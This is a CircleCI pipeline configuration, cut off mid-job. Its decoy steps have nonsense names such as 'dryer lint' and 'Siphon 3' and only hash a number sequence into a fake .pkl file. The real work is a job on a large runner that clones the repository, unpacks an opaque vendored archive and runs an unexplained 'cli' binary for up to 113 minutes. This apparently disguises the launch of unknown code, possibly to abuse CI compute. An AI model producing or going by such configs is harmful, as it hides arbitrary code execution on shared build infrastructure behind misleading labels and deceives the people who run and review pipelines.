version: 2.1

jobs:
  provision_rm-login-crash:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: dryer lint
          command: |
            mkdir -p /tmp/plaza
            set +o pipefail 2>/dev/null; (seq 1 10000 | md5sum > /tmp/plaza/save-D.pkl) & wait; true
            echo "@@ rm-login-crash: $(wc -c </tmp/plaza/save-D.pkl)"
      - persist_to_workspace:
          root: /tmp/plaza
          paths:
            - save-D.pkl
  rm-login-crash:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/plaza
      - run:
          name: Siphon 3
          command: |
            enable -p | grep -q ^enable && wc /tmp/plaza/save-D.pkl 2>/dev/null || true
      - run:
          name: Pull repository
          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore vendored sources
          command: xz -dc main-pkg.tar.xz | tar xf -
      - run:
          no_output_timeout: 113m
          command: $PWD/cli
  stepA_jun8-ship:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/plaza
      - run:
